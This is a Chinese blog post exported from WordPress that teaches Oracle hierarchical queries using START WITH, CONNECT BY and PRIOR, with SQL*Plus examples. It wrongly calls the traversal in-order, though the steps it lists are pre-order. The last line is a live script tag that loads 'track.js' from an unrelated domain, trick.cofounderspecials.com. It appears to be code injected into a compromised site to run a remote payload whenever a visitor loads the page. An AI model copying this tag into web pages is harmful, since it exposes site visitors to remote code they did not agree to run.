---
id: 16
title: 'Oracle中start with和connect by的用法'
date: '2019-10-31T11:44:21+08:00'
author: gavin
layout: post
guid: 'http://gaving.top/?p=16'
permalink: /index.php/2019/10/31/oracle%e4%b8%adstart-with%e5%92%8cconnect-by%e7%9a%84%e7%94%a8%e6%b3%95/
blocksy_post_meta_options:
    - 'a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}'
categories:
    - Oracle
---

<div>connect by 是结构化查询中用到的，其基本语法是：</div><div><div class="cnblogs_code">```
1 select … from tablename
2 start with 条件1
3 connect by 条件2
4 where 条件3;
```

</div></div><div>例： <div class="cnblogs_code">```
1 select * from table
2 start with org_id = ‘HBHqfWGWPy’
3 connect by prior org_id = parent_id;
```

</div></div><div> 简单说来是将一个树状结构存储在一张表里，比如一个表中存在两个字段:org_id，parent_id，那么通过表示每一条记录的parent是谁，就可以形成一个树状结构，用上述语法的查询可以取得这棵树的所有记录，其中：</div><div> 条件1 是根结点的限定语句，当然可以放宽限定条件，以取得多个根结点，实际就是多棵树。  
条件2 是连接条件，其中用PRIOR表示上一条记录，比如 CONNECT BY PRIOR org_id = parent_id；就是说上一条记录的org_id 是本条记录的parent_id，即本记录的父亲是上一条记录。  
条件3 是过滤条件，用于对返回的所有记录进行过滤。</div><div> 简单介绍如下：  
在扫描树结构表时，需要依此访问树结构的每个节点，一个节点只能访问一次，其访问的步骤如下：  
第一步：从根节点开始；  
第二步：访问该节点；  
第三步：判断该节点有无未被访问的子节点，若有，则转向它最左侧的未被访问的子节，并执行第二步，否则执行第四步；  
第四步：若该节点为根节点，则访问完毕，否则执行第五步；  
第五步：返回到该节点的父节点，并执行第三步骤。  
总之：扫描整个树结构的过程也即是中序遍历树的过程。</div><div>1．树结构的描述  
树结构的数据存放在表中，数据之间的层次关系即父子关系，通过表中的列与列间的关系来描述，如EMP表中的EMPNO和MGR，EMPNO表示该雇员的编号，MGR表示领导该雇员的人的编号，即子节点的MGR值等于父节点的EMPNO值。在表的每一行中都有一个表示父节点的MGR（除根节点外），通过每个节点的父节点，就可以确定整个树结构。  
在SELECT命令中使用CONNECT BY 和START WITH 子句可以查询表中的树型结构关系，其命令格式如下：  
SELECT . . .  
CONNECT BY {PRIOR 列名1=列名2|列名1=PRIOR 裂名2}  
[START WITH]；  
其中：CONNECT BY子句说明每行数据将是按层次顺序检索，并规定将表中的数据连入树型结构的关系中。PRIOR运算符必须放置在连接关系的两列中某一个的前面。对于节点间的父子关系，PRIOR运算符在一侧表示父节点，在另一侧表示子节点，从而确定查找树结构是的顺序是自顶向下还是自底向上。</div><div> 在连接关系中，除了可以使用列名外，还允许使用列表达式。START WITH 子句为可选项，用来标识哪个节点作为查找树型结构的根节点，若该子句被省略，则表示所有满足查询条件的行作为根节点。  
START WITH：不但可以指定一个根节点，还可以指定多个根节点。</div><div>2．关于PRIOR  
运算符PRIOR被放置于等号前后的位置，决定着查询时的检索顺序。  
PRIOR被置于CONNECT BY子句中等号的前面时，则强制从根节点到叶节点的顺序检索，即由父节点向子节点方向通过树结构，我们称之为自顶向下的方式。如：  
CONNECT BY PRIOR EMPNO=MGR  
PIROR运算符被置于CONNECT BY 子句中等号的后面时，则强制从叶节点到根节点的顺序检索，即由子节点向父节点方向通过树结构，我们称之为自底向上的方式。例如：  
CONNECT BY EMPNO=PRIOR MGR  
在这种方式中也应指定一个开始的节点。</div><div>3．定义查找起始节点  
在自顶向下查询树结构时，不但可以从根节点开始，还可以定义任何节点为起始节点，以此开始向下查找。这样查找的结果就是以该节点为开始的结构树的一枝。</div><div>4．使用LEVEL  
在具有树结构的表中，每一行数据都是树结构中的一个节点，由于节点所处的层次位置不同，所以每行记录都可以有一个层号。层号根据节点与根节点的距离确定。不论从哪个节点开始，该起始根节点的层号始终为1，根节点的子节点为2， 依此类推。图1.2就表示了树结构的层次。</div><div>5．节点和分支的裁剪  
在对树结构进行查询时，可以去掉表中的某些行，也可以剪掉树中的一个分支，使用WHERE子句来限定树型结构中的单个节点，以去掉树中的单个节点，但它却不影响其后代节点（自顶向下检索时）或前辈节点（自底向顶检索时）。</div><div>6．排序显示  
像在其它查询中一样，在树结构查询中也可以使用ORDER BY 子句，改变查询结果的显示顺序，而不必按照遍历树结构的顺序。</div><div>7. 实例</div><div> oracle 提供了start with connect by 语法结构可以实现递归查询。  
1. 一个简单举例: <div class="cnblogs_code">```
 1 SQL> select *  from test;
 2 BILL_MONTH           DAY_NUMBER MSISDN
 3 -------------------- ---------- --------------------
 4 200803                        1 13800
 5 200803                        3 13800
 6 200803                        2 13800
 7 200803                        2 13801
 8 200803                        4 13804
 9 200803                        5 13804
10 200803                        7 13804
11 200803                        8 13804
12 200803                        6 13802
13 200803                        6 13801
14 200803                        7 13801
15 200803                        8 13801
16 12 rows selected
17 
18 SQL>
19 SQL> select * from test
20   2       start with day_number=1
21   3       connect by  prior day_number=day_number-1 and prior msisdn= msisdn
22   4      ;
23 
24 BILL_MONTH           DAY_NUMBER MSISDN
25 -------------------- ---------- --------------------
26 200803                        1 13800
27 200803                        2 13800
28 200803                        3 13800
29 
30 SQL>
```

<div class="cnblogs_code_toolbar"></div></div>上面的语句查找出了从1开始，并且day\_number 逐渐+1 递增的，并且 msisdn 相同的哪些个数据.  
2\. start with connect by 语法结构  
如上面说看到的例子，其语法结构为start with condition connect by condition （含 prior 关键字)  
start with conditon 给出的seed 数据的范围, connect by 后面给出了递归查询的条件,prior 关键字表示父数据，prior 条件表示子数据需要满足父数据的什么条件。在下面的这个start with connect by 结构中，就表示查找出了从1开始，父数据的day\_number等于子数据的day\_number-1而且父数据的msisdn=子数据的msisdn.  
start with day\_number=1  
connect by prior day\_number=day\_number-1 and prior msisdn= msisdn

</div><script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script>